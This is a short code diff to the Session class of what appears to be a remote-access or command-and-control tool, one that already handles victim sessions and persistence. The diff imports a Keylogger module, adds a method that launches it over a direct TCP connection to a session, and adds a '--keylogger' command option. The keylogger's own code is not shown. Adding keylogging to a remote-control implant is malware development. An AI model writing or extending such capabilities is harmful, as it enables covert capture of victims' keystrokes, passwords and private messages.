@@ -11,6 +11,7 @@ from .handler import Handler
 from .sql import Sql
 from .spawnshell import FakeCmd
 from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN, SPLIT
+from .keylogger import Keylogger
 
 import threading
 import platform 
@@ -49,6 +50,7 @@ class Session:
 
 -b or --back : Back to menu.
 """) 
+
 
     def executeCommand(self,cmd_list):
         '''-c'''
@@ -144,6 +146,12 @@ class Session:
         
         time.sleep(2) #Allows to wait for all connections to end (optional)
 
+    def lonelyKeylogger(self):
+        print("????")
+        keylogger = Keylogger(self.session_nb)
+        keylogger.directTcp()
+
+
     def printInformation(self):
         pass
 
@@ -180,6 +188,9 @@ class Session:
                     elif terminal[i] == "--persistence":
                         self.lonelyPersistence()
                     
+                    elif terminal[i] == "--keylogger":
+                        self.lonelyKeylogger()
+
                     else:
                         pass
                     
